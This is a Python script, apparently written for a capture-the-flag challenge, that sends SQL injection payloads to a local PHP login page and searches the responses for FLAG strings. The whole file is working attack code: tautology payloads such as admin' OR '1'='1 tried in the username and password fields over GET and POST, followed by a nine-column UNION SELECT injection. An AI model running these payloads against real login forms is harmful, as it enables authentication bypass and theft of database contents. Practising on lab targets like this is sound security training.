import requests

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing different injection points and methods\n")

# Test GET with username
print("[1] GET - Username parameter")
r1 = requests.get(target, params={'username': "admin' OR '1'='1", 'password': 'test'})
print(f"Response length: {len(r1.text)}")
print(f"Full response:\n{r1.text}\n")

# Test POST with username
print("\n[2] POST - Username parameter")
r2 = requests.post(target, data={'username': "admin' OR '1'='1", 'password': 'test'})
print(f"Response length: {len(r2.text)}")
print(f"Response contains FLAG: {'FLAG{' in r2.text}")
if 'FLAG{' in r2.text:
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', r2.text)
    print(f"FLAGS FOUND: {flags}")
print()

# Test POST with password
print("\n[3] POST - Password parameter")
r3 = requests.post(target, data={'username': 'admin', 'password': "test' OR '1'='1"})
print(f"Response length: {len(r3.text)}")
print(f"Response contains FLAG: {'FLAG{' in r3.text}")
if 'FLAG{' in r3.text:
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', r3.text)
    print(f"FLAGS FOUND: {flags}")
print()

# Try union injection
print("\n[4] POST - UNION injection")
union_payload = "admin' UNION SELECT 1,2,3,4,5,6,7,8,9-- -"
r4 = requests.post(target, data={'username': union_payload, 'password': 'test'})
print(f"Response length: {len(r4.text)}")
if len(r4.text) != len(r1.text):
    print("Response is different!")
    print(f"Response:\n{r4.text[:500]}")
print()

